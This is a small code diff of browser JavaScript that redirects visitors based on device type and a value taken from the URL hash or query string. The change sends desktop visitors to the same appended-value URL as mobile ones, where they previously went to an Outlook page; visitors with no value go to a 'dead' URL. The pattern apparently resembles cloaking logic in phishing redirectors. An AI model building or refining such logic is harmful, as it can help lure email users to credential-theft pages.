@@ -196,8 +196,9 @@
                     console.log("Mobile device detected. Redirecting to:", redirectUrl);
                     window.location.href = redirectUrl;
                 } else {
-                    console.log("Non-mobile device detected. Redirecting to Outlook:", DESKTOP_REDIRECT_URL);
-                    window.location.href = DESKTOP_REDIRECT_URL;
+                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
+                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                    window.location.href = redirectUrl;
                 }
             } else {
                 console.log("No value found in hash or search. Redirecting all devices to dead URL:", DEAD_URL);
